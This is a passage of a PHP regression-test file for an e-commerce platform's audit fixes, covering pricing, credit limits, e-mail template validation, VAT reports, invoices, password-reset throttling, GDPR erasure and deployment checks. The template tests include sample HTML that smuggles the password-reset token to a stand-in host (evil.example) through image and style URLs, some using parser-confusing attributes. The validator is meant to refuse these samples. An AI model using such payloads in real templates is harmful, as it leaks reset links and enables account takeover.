<?php

// Round 6 review (2026-10-19), medium findings: refunds and prices, e-mail templates, VAT and documents,
// customers, deployment, API events.
echo "\n--- Audit round 6 (medium): refunds, prices, templates, documents, customers, deploy, API events ---\n";
require_once TEST_CLI_DIR . '/../cli/worker.php';
require_once TEST_CLI_DIR . '/../src/Entrypoints/Admin/Orders.php';
Bootstrap::initStoreContext('/', '', 'default');

$r6mJobsDir = sys_get_temp_dir() . '/bbe-r6m-jobs-' . getmypid() . '-' . bin2hex(random_bytes(3));
JobQueue::setDir($r6mJobsDir);
$r6mAdapters = new ReflectionProperty(Adapters::class, 'instances');
$r6mSavedAdapters = $r6mAdapters->getValue();
$r6mUse = static function (PaymentAdapter $gateway) use ($r6mAdapters, $r6mSavedAdapters): PaymentAdapter {
    $r6mAdapters->setValue(null, ['payment' => $gateway] + $r6mSavedAdapters);
    return $gateway;
};
$r6mOrder = static function (string $provider, string $paymentId, int $total = 1000) use ($pdo): int {
    $snapshot = json_encode(['provider' => $provider, 'service_type' => 'online_card', 'requires_online' => true]);
    $pdo->prepare("INSERT INTO orders (order_number, customer_name, customer_email, customer_phone, shipping_addr, subtotal, shipping_cost, tax_amount, discount_amount, total, currency, status, payment_status, payment_method, payment_id, payment_method_snapshot, store_id, created_at)
        VALUES (?, 'R6M', 'r6m@example.test', '', '{}', ?, 0, 0, 0, ?, 'eur', 'delivered', 'paid', ?, ?, ?, 'default', " . Db::now() . ")")
        ->execute(['ARR-GOPAY-' . $paymentId, $total, $total, $provider, $paymentId, $snapshot]);
    return (int)$pdo->lastInsertId();
};
$r6mState = static function (int $orderId): array {
    $order = Orders::byId($orderId);
    return [(string)$order['payment_status'], PaymentService::refundedAmount($orderId), PaymentService::refundableBalance($orderId)];
};
$r6mRunJobs = static function (int $orderId) use ($r6mJobsDir): void {
    foreach (glob($r6mJobsDir . '/pending/*.json') ?: [] as $file) {
        $job = json_decode((string)file_get_contents($file), true);
        if (($job['type'] ?? '') !== 'payment_refund' || (int)($job['payload']['order_id'] ?? 0) !== $orderId) continue;
        unlink($file);
        handlePaymentRefund($job['payload'], $job);
    }
};

// Each section reports its own exception, so one missing fix does not hide the others.
$r6mRaised = static function (Throwable $e): void {
    assert_true(false, 'Round 6 medium regression raised ' . get_class($e) . ': ' . $e->getMessage() . ' @' . basename($e->getFile()) . ':' . $e->getLine());
};
try {
    // --- Prices: a group product-level row + the variant surcharge never outprices the public variant row ----------
    $r6mDb = Db::get();
    $r6mDb->prepare("INSERT INTO categories (store_id, slug, name, parent_id, path, depth) VALUES ('default', 'r6m-cat', 'R6M Cat', NULL, 'r6m-cat', 0)")->execute();
    $r6mDb->prepare("INSERT INTO products (store_id, category_id, sku, slug, name, price, stock, status) VALUES ('default', ?, 'R6M-P', 'r6m-p', 'R6M Product', 30000, 10, 'active')")->execute([(int)$r6mDb->lastInsertId()]);
    $r6mProduct = (int)$r6mDb->lastInsertId();
    $r6mDb->prepare("INSERT INTO variants (product_id, sku, name, stock, price_absolute, price_delta) VALUES (?, 'R6M-XL', 'XL', 5, NULL, 2425)")->execute([$r6mProduct]);
    $r6mXl = (int)$r6mDb->lastInsertId();
    $r6mDb->prepare("INSERT INTO price_lists (store_id, code, name, currency, customer_group_id, priority, active) VALUES ('default', 'r6m-public', 'R6M public', 'eur', NULL, 0, 1)")->execute();
    $r6mDb->prepare('INSERT INTO price_list_prices (price_list_id, product_id, variant_id, min_qty, price) VALUES (?, ?, ?, 1, 1000)')->execute([(int)$r6mDb->lastInsertId(), $r6mProduct, $r6mXl]);
    $r6mDb->prepare("INSERT INTO customer_groups (store_id, code, name, discount_bps, active) VALUES ('default', 'r6m-b2b', 'R6M B2B', 0, 1)")->execute();
    $r6mGroup = (int)$r6mDb->lastInsertId();
    $r6mDb->prepare("INSERT INTO price_lists (store_id, code, name, currency, customer_group_id, priority, active) VALUES ('default', 'r6m-b2b-list', 'R6M B2B', 'eur', ?, 0, 1)")->execute([$r6mGroup]);
    $r6mGroupList = (int)$r6mDb->lastInsertId();
    $r6mDb->prepare('INSERT INTO price_list_prices (price_list_id, product_id, variant_id, min_qty, price) VALUES (?, ?, NULL, 1, 30000)')->execute([$r6mGroupList, $r6mProduct]);
    $r6mDb->prepare("INSERT INTO customers (store_id, email, password_hash, name, customer_group_id, status) VALUES ('default', 'r6m-b2b@example.test', '!test!', 'R6M B2B', ?, 'active')")->execute([$r6mGroup]);
    $r6mB2b = (int)$r6mDb->lastInsertId();
    $r6mPrice = static fn(?int $variant, ?int $customer): array => array_intersect_key(
        Pricing::applyPriceList(['id' => $r6mProduct, 'price' => 30000, 'currency' => 'eur'], $variant, 1, $customer), ['price' => 0, 'price_list_snapshot' => 0]);
    assert_equals(1000, (int)$r6mPrice($r6mXl, null)['price'], 'R6 prices: a guest pays the public variant row');
    assert_equals([1000, 'r6m-public'], [(int)$r6mPrice($r6mXl, $r6mB2b)['price'], (string)($r6mPrice($r6mXl, $r6mB2b)['price_list_snapshot']['code'] ?? '')],
        'R6 prices: a B2B member pays no more than a guest for the surcharged variant (was 324.25 € from the group product row)');
    assert_equals(30000, (int)$r6mPrice(null, $r6mB2b)['price'], 'R6 prices: the group product row still prices the product');
    $r6mDb->prepare('INSERT INTO price_list_prices (price_list_id, product_id, variant_id, min_qty, price) VALUES (?, ?, ?, 1, 800)')->execute([$r6mGroupList, $r6mProduct, $r6mXl]);
    assert_equals([800, 'r6m-b2b-list'], [(int)$r6mPrice($r6mXl, $r6mB2b)['price'], (string)($r6mPrice($r6mXl, $r6mB2b)['price_list_snapshot']['code'] ?? '')],
        'R6 prices: a cheaper group variant row wins for the member');

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- B2B credit limit: only unpaid orders are credit exposure ------------------------------------------------------
    $r6mDb->prepare("INSERT INTO companies (store_id, code, legal_name, approval_status, credit_limit, payment_terms_days, invoice_purchase, active) VALUES ('default', 'r6m-co', 'R6M s.r.o.', 'approved', 5000, 14, 1, 1)")->execute();
    $r6mCompany = (int)$r6mDb->lastInsertId();
    $r6mDb->prepare("INSERT INTO customers (store_id, email, password_hash, name, company_id, status) VALUES ('default', 'r6m-co@example.test', '!test!', 'R6M Co', ?, 'active')")->execute([$r6mCompany]);
    $r6mMember = (int)$r6mDb->lastInsertId();
    foreach (['pending' => 1000, 'paid' => 3000, 'partially_refunded' => 3000, 'refund_pending' => 3000, 'disputed' => 3000, 'refunded' => 3000] as $r6mPaymentStatus => $r6mTotal) {
        $r6mDb->prepare("INSERT INTO orders (order_number, customer_id, customer_name, customer_email, customer_phone, shipping_addr, subtotal, shipping_cost, tax_amount, discount_amount, total, currency, status, payment_status, payment_method, store_id, created_at)
            VALUES (?, ?, 'R6M Co', 'r6m-co@example.test', '', '{}', ?, 0, 0, 0, ?, 'eur', 'delivered', ?, 'invoice', 'default', " . Db::now() . ")")
            ->execute(['R6M-CL-' . $r6mPaymentStatus, $r6mMember, $r6mTotal, $r6mTotal, $r6mPaymentStatus]);
    }
    assert_equals(1000, Customers::companyOpenTotal($r6mCompany), 'R6 credit limit: paid orders with a refund or dispute are not open credit (was 13000)');
    assert_true(Customers::canInvoicePurchase($r6mMember, 4000) && !Customers::canInvoicePurchase($r6mMember, 4001), 'R6 credit limit: the member can buy on invoice up to the unused limit');

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- E-mail templates: token leaks, hard-coded accounts, security notices ------------------------------------------
    $r6mErrors = static fn(string $template, string $html): string => implode(' ', EmailTemplates::validate($template, 'R6M subject', $html, ''));
    assert_true(str_contains($r6mErrors('account_password_reset', '<p>Hi</p><img alt=">" src="https://evil.example/p.gif?t= {{reset_url}} ">'), 'reset_url'),
        'R6 templates: a reset link in an image address after alt=">" is refused (was accepted)');
    assert_true(str_contains($r6mErrors('account_password_reset', '<style>p{background:url( {{reset_url}} )}</style><p>Hi</p>'), 'reset_url'),
        'R6 templates: a reset link in a style sheet is refused');
    assert_equals('', $r6mErrors('account_password_reset', '<p><a title="a>b" href="{{reset_url}}">Reset</a></p><p>Copy: {{reset_url}}</p>'),
        'R6 templates: a whole reset link and a plain copy line are still allowed');
    foreach (['<p>iban: sk31 1200 0000 1987 4263 7541</p>' => 'lower case', '<p>IBAN SK31-1200-0000-1987-4263-7541</p>' => 'hyphens',
        '<p>IBAN SK31.1200.0000.1987.4263.7541</p>' => 'dots', '<p>Účet: 19-2000145399/0800</p>' => 'a Czech account number',
        '<p>Účet 2000145399 / 0800</p>' => 'a Czech account number without prefix', '<p>XX00 SK31 1200 0000 1987 4263 7541</p>' => 'a decoy group in front'] as $r6mHtml => $r6mHow) {
        assert_true(str_contains($r6mErrors('order_confirmation', $r6mHtml), '{{bank_iban}}'), "R6 templates: a hard-coded bank account written with {$r6mHow} is refused");
    }
    // R8: a saved order confirmation must keep the consumer information, so the accepted samples carry it.
    $r6mLegal = '<p>{{seller_name}}, {{seller_address}}, <a href="{{withdrawal_url}}">Odstúpenie</a>, <a href="{{terms_url}}">VOP</a></p>';
    assert_equals('', $r6mErrors('order_confirmation', '<p>Splatnosť 12/2026, objednávka {{order_number}} 2026000123/2026, IBAN {{bank_iban}}</p>' . $r6mLegal),
        'R6 templates: dates and order numbers are not taken for a bank account');
    // Round 7: a stray apostrophe in an unquoted attribute (alt=x=a') no longer hides the rest of the tag.
    assert_true(str_contains($r6mErrors('account_password_reset', '<p>Hi</p><img alt=x=a\' src="https://evil.example/p.gif?t= {{reset_url}} ">'), 'reset_url'),
        'R7 templates: a reset link in an image address after alt=x=a\' is refused (was accepted)');
    assert_equals('', $r6mErrors('account_password_reset', '<p>Don\'t wait, it\'s <a title="it\'s" href=\'{{reset_url}}\'>here</a>: {{reset_url}}</p>'),
        'R7 templates: apostrophes in text and attribute values still allow a whole reset link');
    foreach (['<p>IBAN sk31_1200_0000_1987_4263_7541</p>' => 'underscores', '<p>IBAN SK31/1200/0000/1987/4263/7541</p>' => 'slashes',
        '<p>IBAN S K 3 1 1 2 0 0 0 0 0 0 1 9 8 7 4 2 6 3 7 5 4 1</p>' => 'a space between every character'] as $r6mHtml => $r6mHow) {
        assert_true(str_contains($r6mErrors('order_confirmation', $r6mHtml), '{{bank_iban}}'), "R7 templates: a hard-coded bank account written with {$r6mHow} is refused (was accepted)");
    }
    assert_equals('', $r6mErrors('order_confirmation', '<p>Doručenie 2-4 dni, objednávka SK-2026-000123, zásielka Z 222 3333 444, IBAN {{bank_iban}}</p>' . $r6mLegal),
        'R7 templates: delivery times, order and tracking numbers are still not taken for a bank account');
    assert_true(!EmailTemplates::editable('core_drift_alert', 'sk') && !EmailTemplates::editable('merchant_incident', 'sk') && EmailTemplates::editable('order_shipped', 'sk'),
        'R6 templates: the security notices (core drift alert, incident) cannot be edited');
    $r6mLockedSave = EmailTemplates::save('core_drift_alert', 'sk', ['subject' => 'All fine', 'html' => '<p>All fine</p>', 'text' => '']);
    assert_true(!$r6mLockedSave['ok'], 'R6 templates: a security notice override is refused on save');
    $r6mDb->prepare("INSERT INTO email_template_overrides (store_id, template, locale, subject, html, body_text, updated_by, updated_at) VALUES ('default', 'merchant_incident', 'sk', 'All fine', '<p>All fine</p>', '', 'r6m', " . Db::now() . ")")->execute();
    assert_equals(EmailTemplates::fileSource('merchant_incident', 'sk'), EmailTemplates::source('merchant_incident', 'sk'), 'R6 templates: a stored override of a security notice is never sent');
    $r6mDb->prepare("DELETE FROM email_template_overrides WHERE template = 'merchant_incident' AND updated_by = 'r6m'")->execute();

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- OSS report per store: credit notes of the unprefixed series count -----------------------------------------
    if (!function_exists('collect')) {
        define('BB_TEST_LOAD_OSS_ONLY', true);
        require_once TEST_CLI_DIR . '/oss-report.php';
    }
    $r6mOssOrder = $r6mOrder('manual', '', 6000);
    $r6mInvoice = $pdo->prepare("INSERT INTO invoices (order_id, store_id, number, issued_at, delivery_date, due_date, pdf_path, total_net, total_vat, total_gross, currency,
            vat_breakdown, customer_snapshot, seller_snapshot, payment_method, locale, status, download_token, vat_scenario, type, refers_to_invoice_id)
        VALUES (?, 'default', ?, '2032-05-10', '2032-05-10', '2032-05-24', 'x.pdf', ?, ?, ?, 'eur', ?, '{\"country\":\"AT\"}', '{}', 'bank', 'de', 'issued', ?, 'oss', ?, ?)");
    $r6mInvoice->execute([$r6mOssOrder, '2032' . random_int(100000, 999999), 5000, 1000, 6000, '{"20":{"net":5000,"vat":1000}}', bin2hex(random_bytes(8)), 'invoice', null]);
    $r6mInvoice->execute([$r6mOssOrder, 'CN-2032' . random_int(100000, 999999), -2500, -500, -3000, '{"20":{"net":2500,"vat":500}}', bin2hex(random_bytes(8)), 'credit_note', (int)$pdo->lastInsertId()]);
    $r6mOss = static fn(?string $store): array => array_map(static fn(array $row): array => [$row['net'], $row['vat'], $row['invoice_count']],
        array_values(array_filter(collect('2032-05-01', '2032-05-31', $store), static fn(array $row): bool => $row['consumption_country'] === 'AT')));
    assert_equals([[2500, 500, 2]], $r6mOss(null), 'R6 OSS: the whole report nets the credit note');
    assert_equals([[2500, 500, 2]], $r6mOss('default'), 'R6 OSS: --store for the unprefixed series nets its CN- credit note too (was 5000/1000)');

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- Free shipping waives the carriage, not the cash-on-delivery surcharge ---------------------------------------
    assert_equals([150, 0], [ShippingService::freeShippingPrice(['price' => 490, 'base_price' => 340, 'cod_surcharge' => 150]),
        ShippingService::freeShippingPrice(['price' => 390, 'cod_surcharge' => 0])], 'R6 free shipping: a free database rate keeps its COD surcharge; adapter rates charge COD as a payment fee');
    $r6mApi = str_replace("\r\n", "\n", (string)file_get_contents(TEST_CLI_DIR . '/../src/Http/ApiHandlers.php'));
    assert_true(str_contains($r6mApi, '$shippingCost = $promotionFreeShipping ? ShippingService::freeShippingPrice($selectedRate) : (int)$selectedRate[\'price\'];'),
        'R6 free shipping: an automatic free-shipping promotion still charges the COD surcharge at checkout (was 0)');

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- Invoice VAT notice: the seller's country grants the exemption, the customer's language only words it ---------
    $r6mNotice = static fn(string $key, string $locale, string $seller): string => (string)InvoiceService::vatNotice(['reverse_charge_note_key' => $key], $locale, false, $seller);
    assert_true(!str_contains($r6mNotice('vat.reverse_charge_note', 'de', 'SK'), 'UStG') && str_contains($r6mNotice('vat.reverse_charge_note', 'de', 'SK'), 'Art. 138'),
        'R6 invoice: a Slovak seller\'s German invoice cites the VAT Directive, not the German UStG (was § 6a UStG)');
    assert_true(!str_contains($r6mNotice('vat.export_note', 'cs', 'SK'), '§') && str_contains($r6mNotice('vat.export_note', 'cs', 'SK'), 'čl. 146'),
        'R6 invoice: a Slovak seller\'s Czech export invoice cites no Czech act');
    assert_true(str_contains($r6mNotice('vat.reverse_charge_note', 'de', 'DE'), '§ 6a UStG') && str_contains($r6mNotice('vat.reverse_charge_note', 'sk', 'sk'), '§ 43'),
        'R6 invoice: a seller in the language\'s own country still cites its national act');
    assert_true(str_contains($r6mNotice('vat.reverse_charge_note', 'en', 'SK'), 'Article 138'), 'R6 invoice: the English wording cites the Directive for every seller');
    $r6mPdfSource = str_replace("\r\n", "\n", (string)file_get_contents(TEST_CLI_DIR . '/../src/InvoiceService.php'));
    assert_true(str_contains($r6mPdfSource, "!empty(\$vatBreakdown['services_only']), (string)(\$sellerSnap['country'] ?? ''));"),
        'R6 invoice: the PDF passes the seller snapshot\'s country to the VAT notice');

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- invoices-backfill: other stores' orders and orders whose invoice was cancelled get an invoice ------------------
    $r6mStorno = $r6mOrder('manual', 'r6m-storno', 2400);
    $r6mFirst = InvoiceService::issue($r6mStorno);
    InvoiceService::cancel((int)$r6mFirst['id'], 'R6M storno');
    $r6mSecond = InvoiceService::issue($r6mStorno);
    assert_true((int)$r6mSecond['id'] !== (int)$r6mFirst['id'] && (string)$r6mSecond['status'] === 'issued' && (string)$r6mSecond['number'] !== (string)$r6mFirst['number'],
        'R6 backfill: an order whose invoice was cancelled gets a new invoice (was the cancelled one, reported as OK)');
    $r6mVoided = $pdo->query('SELECT type, status, number FROM invoices WHERE id = ' . (int)$r6mFirst['id'])->fetch(PDO::FETCH_ASSOC);
    assert_equals(['replaced', 'cancelled', (string)$r6mFirst['number']], [(string)$r6mVoided['type'], (string)$r6mVoided['status'], (string)$r6mVoided['number']],
        'R6 backfill: the cancelled invoice keeps its number for the audit trail');
    assert_equals((int)$r6mSecond['id'], (int)InvoiceService::issue($r6mStorno)['id'], 'R6 backfill: issuing again returns the replacement');
    $r6mCzOrder = $r6mOrder('manual', 'r6m-cz', 1800);
    $pdo->exec("UPDATE orders SET store_id = 'cz' WHERE id = {$r6mCzOrder}");
    $r6mCzInvoice = PaymentWebhookRouting::within('cz', static fn(): array => InvoiceService::issue($r6mCzOrder));
    assert_equals('cz', (string)$pdo->query('SELECT store_id FROM invoices WHERE id = ' . (int)$r6mCzInvoice['id'])->fetchColumn(), 'R6 backfill: an invoice issued in the order\'s store belongs to that store');
    $r6mBackfill = str_replace("\r\n", "\n", (string)file_get_contents(TEST_CLI_DIR . '/invoices-backfill.php'));
    assert_true(str_contains($r6mBackfill, 'o.store_id') && str_contains($r6mBackfill, "PaymentWebhookRouting::within((string)\$row['store_id'], static fn(): array => InvoiceService::issue(\$oid))")
        && str_contains($r6mBackfill, "i.type = 'invoice' AND i.status <> 'cancelled'"),
        'R6 backfill: invoices-backfill issues every store\'s orders in their own store and replaces cancelled invoices (was the CLI default store only)');

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- vat-backfill: the order's own seller, the whole order total ----------------------------------------------------
    // A script without the test guard would run (and exit) here.
    if (!str_contains((string)file_get_contents(TEST_CLI_DIR . '/vat-backfill.php'), 'BB_TEST_LOAD_VAT_BACKFILL_ONLY')) {
        throw new RuntimeException('cli/vat-backfill.php has no testable VAT computation (vatBackfillOrder)');
    }
    if (!function_exists('vatBackfillOrder')) {
        define('BB_TEST_LOAD_VAT_BACKFILL_ONLY', true);
        require TEST_CLI_DIR . '/vat-backfill.php';
    }
    $r6mStores = ['default_store' => 'default', 'stores' => ['default' => ['legal' => ['country' => 'SK']], 'cz' => ['legal' => ['country' => 'CZ']], 'bare' => []]];
    assert_equals(['CZ', 'SK', 'SK'], [vatBackfillSeller($r6mStores, 'cz')['country'], vatBackfillSeller($r6mStores, 'bare')['country'], vatBackfillSeller($r6mStores, 'gone')['country']],
        'R6 VAT backfill: the seller is the order\'s store (a store without a legal block sells as the default store)');
    $r6mLegacy = ['shipping_addr' => '{"country":"CZ"}', 'discount_amount' => 1210, 'total' => 12100 - 1210 + 605, 'created_at' => '2025-06-01 10:00:00'];
    $r6mSnap = vatBackfillOrder($r6mLegacy, [['id' => 1, 'total' => 12100, 'vat_class' => 'standard']], vatBackfillSeller($r6mStores, 'cz'));
    assert_equals(['CZ', 1995, 9500], [$r6mSnap['rate_country'], $r6mSnap['vat_total'], $r6mSnap['net_total']],
        'R6 VAT backfill: a Czech store\'s order is taxed at the Czech rate over the whole total — discount and shipping included (was SK rate on the goods only)');
    assert_equals((int)$r6mLegacy['total'], $r6mSnap['vat_total'] + $r6mSnap['net_total'], 'R6 VAT backfill: net + VAT = order total');

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- Customers: forgot-password throttle, guest erasure next to an account, invoice link on a store domain ----------
    $r6mStoreCtx = static function (string $id): void { StoreContext::activate(StoreContext::resolve(Bootstrap::stores(), null, null, $id)); };
    $r6mSecurityCfg = new ReflectionProperty(Security::class, 'cfg');
    $r6mSavedCfg = $r6mSecurityCfg->getValue();
    $r6mStoresProp = new ReflectionProperty(Bootstrap::class, 'stores');
    $r6mSavedStores = $r6mStoresProp->getValue();
    Security::setRateDbForTesting(new PDO('sqlite::memory:'));
    MailService::useAdapter(new LogMail(['log_file' => sys_get_temp_dir() . '/bbe-r6m-mail-' . getmypid() . '.log']));
    try {
        try {
            $r6mCfg = ['app_url' => 'https://r6m-main.example'];
            $r6mVictim = 'r6m-victim-' . bin2hex(random_bytes(3)) . '@example.test';
            Customers::register($r6mVictim, 'Victim-pass-1', 'Victim');
            $r6mStoreCtx('cz');
            $r6mElsewhere = [];
            for ($i = 0; $i < 4; $i++) $r6mElsewhere[] = Customers::forgotPassword($r6mVictim, 'en', $r6mCfg);
            $r6mStoreCtx('default');
            assert_equals(['unknown', 'unknown', 'unknown', 'unknown', 'sent'], [...$r6mElsewhere, Customers::forgotPassword($r6mVictim, 'en', $r6mCfg)],
                'R6 forgot password: requests in another store (no account there) never block the owner\'s reset (was throttled)');
            assert_equals(['sent', 'sent', 'throttled'], [Customers::forgotPassword($r6mVictim, 'en', $r6mCfg), Customers::forgotPassword($r6mVictim, 'en', $r6mCfg), Customers::forgotPassword($r6mVictim, 'en', $r6mCfg)],
                'R6 forgot password: three reset mails an hour still reach one address');
        } catch (Throwable $e) {
            $r6mRaised($e);
            $r6mStoreCtx('default');
        }

        // Guest erasure while an account of the store uses the address.
        $r6mShared = 'r6m-shared-' . bin2hex(random_bytes(3)) . '@example.test';
        [, $r6mSharedId] = Customers::register($r6mShared, 'Shared-pass-1', 'Shared');
        $r6mGuestOrder = $r6mOrder('manual', 'r6m-guest-' . bin2hex(random_bytes(3)), 900);
        $pdo->prepare('UPDATE orders SET customer_email = ? WHERE id = ?')->execute([$r6mShared, $r6mGuestOrder]);
        $pdo->prepare("INSERT INTO email_log (store_id, order_id, recipient, template, subject, payload) VALUES ('default', ?, ?, 'order_created', 'R6M guest order', '{}')")->execute([$r6mGuestOrder, $r6mShared]);
        $pdo->prepare("INSERT INTO email_log (store_id, recipient, template, subject, payload) VALUES ('default', ?, 'account_welcome', 'R6M account mail', '{}')")->execute([$r6mShared]);
        $pdo->prepare("INSERT INTO abandoned_carts (session_id, customer_email, cart_data, store_id) VALUES (?, ?, '{\"items\":[]}', 'default')")->execute(['r6m-' . bin2hex(random_bytes(6)), $r6mShared]);
        GdprService::anonymizeGuest($r6mShared, 'r6m-test');
        $r6mCount = static function (string $sql, array $params) use ($pdo): int { $stmt = $pdo->prepare($sql); $stmt->execute($params); return (int)$stmt->fetchColumn(); };
        assert_equals([0, 1, 1, 1], [
            $r6mCount("SELECT COUNT(*) FROM email_log WHERE recipient = ? AND subject = 'R6M guest order'", [$r6mShared]),
            $r6mCount("SELECT COUNT(*) FROM email_log WHERE recipient = ? AND subject = 'R6M account mail'", [$r6mShared]),
            $r6mCount('SELECT COUNT(*) FROM abandoned_carts WHERE customer_email = ?', [$r6mShared]),
            $r6mCount("SELECT COUNT(*) FROM customers WHERE id = ? AND email = ?", [(int)$r6mSharedId, $r6mShared]),
        ], 'R6 guest erase: the guest order\'s mail is erased, the account\'s own mail, cart and account are not (were erased)');

        // Invoice link of a store on its own domain.
        $r6mSecurityCfg->setValue(null, ['app_url' => 'https://r6m-main.example/base'] + (array)$r6mSavedCfg);
        $r6mDomainStores = Bootstrap::stores();
        $r6mDomainStores['stores']['pl']['domains'] = ['r6m-pl.example'];
        $r6mDomainStores['stores']['pl']['url_prefix'] = '';
        $r6mStoresProp->setValue(null, $r6mDomainStores);
        $r6mStoreCtx('pl');
        $r6mLink = InvoiceService::mailVars(['seller_snapshot' => '{}', 'total_gross' => 100, 'currency' => 'pln', 'number' => 'X', 'issued_at' => '', 'due_date' => '', 'download_token' => str_repeat('a', 64)], [])['invoice_download_url'];
        assert_true(str_starts_with($r6mLink, 'https://r6m-pl.example/base/') && preg_match('~/account\.php\?p=invoice#[0-9a-f]{64}$~', $r6mLink) === 1,
            "R6 invoice mail: a store on its own domain links its invoice on that domain ({$r6mLink})");
    } finally {
        $r6mSecurityCfg->setValue(null, $r6mSavedCfg);
        $r6mStoresProp->setValue(null, $r6mSavedStores);
        MailService::useAdapter(null);
        LogMail::clearCaptured();
        $r6mStoreCtx('default');
    }

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- Deploy: install refuses private paths in the web root, Docker uploads and downloads, read-only database -------
    $r6mBase = sys_get_temp_dir() . '/bbe-r6m-deploy-' . getmypid() . '-' . bin2hex(random_bytes(3));
    $r6mApp = $r6mBase . '/public_html/shop';
    mkdir($r6mApp, 0777, true);
    $r6mPaths = static fn(string $dir): array => [
        'db_driver' => 'sqlite', 'db_sqlite_path' => $dir . '/db/shop.sqlite', 'private_runtime_dir' => $dir,
        'private_cache_dir' => $dir . '/cache', 'jobs_dir' => $dir . '/jobs', 'invoice_storage_dir' => $dir . '/invoices',
        'backup_storage_dir' => $dir . '/backups', 'backup_log_file' => $dir . '/logs/backup.log', 'structured_log_file' => $dir . '/logs/app.jsonl',
        'cache_dir' => $dir . '/app-cache', 'uploads_dir' => $dir . '/uploads', 'digital_assets_base_dir' => $dir . '/downloads',
    ];
    $r6mServed = $r6mBase . '/public_html/shop-data';
    $r6mRefused = null;
    try { Setup::apply($r6mPaths($r6mServed), $r6mApp); } catch (RuntimeException $e) { $r6mRefused = $e->getMessage(); }
    assert_true($r6mRefused !== null && str_contains($r6mRefused, 'web root') && !is_dir($r6mServed . '/db'),
        'R6 install: apply refuses private paths inside the web root before the database exists (install exited 0 with a downloadable database)');
    $r6mPrivate = $r6mBase . '/private';
    Setup::apply($r6mPaths($r6mPrivate), $r6mApp);
    assert_true(is_dir($r6mPrivate . '/downloads'), 'R6 install: apply creates the private digital-products directory');
    $r6mExample = require dirname(TEST_CLI_DIR) . '/config.example.php';
    $r6mNorm = static fn(string $path): string => str_replace('\\', '/', $path);
    assert_true(str_starts_with($r6mNorm((string)$r6mExample['digital_assets_base_dir']), $r6mNorm((string)$r6mExample['private_runtime_dir']) . '/'),
        'R6 Docker: digital products live under the private runtime directory, the persistent private volume (was /var/www/private_downloads on the read-only root)');
    $r6mIni = parse_ini_file(dirname(TEST_CLI_DIR) . '/deploy/php.ini') ?: [];
    $r6mMb = static fn(string $v): int => (int)$v * (str_ends_with(strtoupper($v), 'G') ? 1024 : (str_ends_with(strtoupper($v), 'M') ? 1 : 0));
    assert_true($r6mMb((string)($r6mIni['upload_max_filesize'] ?? '2M')) >= 20 && $r6mMb((string)($r6mIni['post_max_size'] ?? '8M')) >= $r6mMb((string)($r6mIni['upload_max_filesize'] ?? '2M')),
        'R6 Docker: PHP accepts uploads up to nginx\'s 20 MB (was PHP\'s 2 MB default)');

    // Read-only database: SELECT works, nothing can be saved.
    $r6mDbFile = $r6mBase . '/ro.sqlite';
    $r6mSeed = new PDO('sqlite:' . $r6mDbFile);
    $r6mSeed->exec('CREATE TABLE schema_migrations (id INTEGER PRIMARY KEY, name TEXT, checksum TEXT, applied_at TEXT, duration_ms INTEGER)');
    $r6mSeed->exec('CREATE TABLE orders (id INTEGER PRIMARY KEY)');
    $r6mSeed = null;
    $r6mReadyCfg = ['jobs_dir' => $r6mPrivate . '/jobs', 'private_cache_dir' => $r6mPrivate . '/cache'];
    $r6mOpen = static fn(): PDO => new PDO('sqlite:' . $r6mDbFile, null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    assert_equals(['ready', 'ok'], [Health::readiness($r6mReadyCfg, dirname(TEST_CLI_DIR), $r6mOpen())['status'], Health::readiness($r6mReadyCfg, dirname(TEST_CLI_DIR), $r6mOpen())['checks']['database']],
        'R6 readiness: a writable database is ready');
    chmod($r6mDbFile, 0444);
    clearstatcache(true, $r6mDbFile);
    // root (Docker CI images, some containers) ignores permission bits, so the file stays writable and the check proves nothing.
    if (is_writable($r6mDbFile)) {
        echo "  [SKIP] R6 readiness/doctor on a read-only database (chmod 0444 has no effect for this user, e.g. root)\n";
    } else try {
        $r6mRo = $r6mOpen();
        $r6mReady = Health::readiness($r6mReadyCfg, dirname(TEST_CLI_DIR), $r6mRo);
        assert_equals(['not_ready', 'read_only'], [$r6mReady['status'], $r6mReady['checks']['database'] ?? ''], 'R6 readiness: /readyz is not ready on a read-only database (was ready)');
        $r6mDoctor = [];
        foreach (Setup::doctor(require dirname(TEST_CLI_DIR) . '/config.php', dirname(TEST_CLI_DIR), $r6mRo)['checks'] as $r6mCheck) $r6mDoctor[$r6mCheck['name']] = $r6mCheck['status'];
        assert_equals('fail', $r6mDoctor['database.writable'] ?? 'missing', 'R6 doctor: a read-only database fails the doctor (was ready)');
        $r6mRo = null;
    } finally {
        chmod($r6mDbFile, 0666);
    }
    $r6mTree = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($r6mBase, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
    foreach ($r6mTree as $r6mItem) $r6mItem->isDir() ? @rmdir($r6mItem->getPathname()) : @unlink($r6mItem->getPathname());
    @rmdir($r6mBase);

} catch (Throwable $e) {
    $r6mRaised($e);
}
try {
    // --- API events: product.updated and stock.adjusted also for admin, import, feed and warehouse changes ------------
    $pdo->exec("INSERT INTO products (store_id, category_id, sku, slug, name, price, stock, status)
        SELECT 'default', id, 'R6M-EVT', 'r6m-evt', 'R6M Event', 1500, 0, 'active' FROM categories WHERE store_id = 'default' ORDER BY id LIMIT 1");
    $r6mEvtId = (int)$pdo->lastInsertId();
    $r6mEvents = static function (string $type) use ($pdo, $r6mEvtId): array {
        $stmt = $pdo->prepare('SELECT payload FROM event_outbox WHERE event_type = ? AND aggregate_id = ? ORDER BY seq');
        $stmt->execute([$type, (string)$r6mEvtId]);
        return array_map(static fn(string $json): array => json_decode($json, true), $stmt->fetchAll(PDO::FETCH_COLUMN));
    };
    Import::importProduct(['sku' => 'R6M-EVT', 'name' => 'R6M Event', 'price' => '12.00'], $pdo);
    $r6mUpdated = $r6mEvents('product.updated');
